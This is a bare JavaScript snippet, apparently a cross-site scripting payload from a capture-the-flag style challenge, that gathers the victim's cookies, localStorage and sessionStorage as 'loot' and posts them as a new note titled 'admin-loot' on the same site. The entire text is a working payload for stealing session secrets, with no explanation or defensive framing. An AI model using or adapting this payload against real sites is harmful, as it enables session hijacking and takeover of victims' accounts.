(async () => {
  const loot = {
    cookie: document.cookie,
    localStorage: Object.fromEntries(Object.entries(localStorage)),
    sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
  };

  const body = new URLSearchParams({
    title: "admin-loot",
    body: JSON.stringify(loot, null, 2),
  });

  // Create a new paste on the same site containing the loot
  await fetch("/note/new", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body.toString(),
  });
})();
